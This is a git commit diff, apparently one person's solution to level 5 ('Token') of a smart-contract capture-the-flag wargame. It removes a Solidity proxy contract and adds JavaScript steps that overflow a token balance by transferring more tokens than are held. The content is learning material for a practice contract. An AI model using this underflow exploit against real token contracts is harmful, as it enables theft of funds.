05f2a4044dffd54179d9a44ec0d8db2347bccb61
Ben Sparks <bensparks0@gmail.com>
2021-01-20 11:11:21 +0200

    Completed Level 5 - Token

--- Level 5 - Token/proxy.sol
+++
@@ -1,7 +0,0 @@
-pragma solidity ^0.6.0;
-
-contract Proxy {
-  function gibeTokens(address _to, uint _value) public {
-    address(0x53ecB9a2a1BAC32175B2895f696c8E626F30f2a2).call(abi.encodeWithSignature("transfer(address, uint256)", _to, _value));
-  }
-}
--- Level 5 - Token/steps.js
+++ Level 5 - Token/steps.js
@@ -3,12 +3,18 @@
 // -------------------------------
 // STRATEGY:
 // 1. Odometers tick back to zero once they reach the max num
-// 2. Exploit the transfer() function by transferring a positive
-//      num of tokens from a proxy contract that has 0 tokens
-// 3. Should pass the require() by underflowing
-// 4. Should add a positive token amount to msg.sender and _to
+// 2. Exploit the transfer() function by calling transfer() with
+//     more tokens than I have - causing an underflow
+// 3. Check the underflow caused my balance to tick back around to a high number
 // -------------------------------------------- 
 // STEPS TO COMPLETE LEVEL
 // -----------------------
 
-// 1 - 
+// 1 - Call transfer() from my account, sending more tokens than I have
+// Here I send 21 when I only have 20. Sending to the deployer instance
+// but could be any other address
+await contract.transfer(instance, 21, {from: player, gas: 1000000})
+
+// 2 - Check my balance increased to a massive number
+await contract.balanceOf(player)
+// it did :)
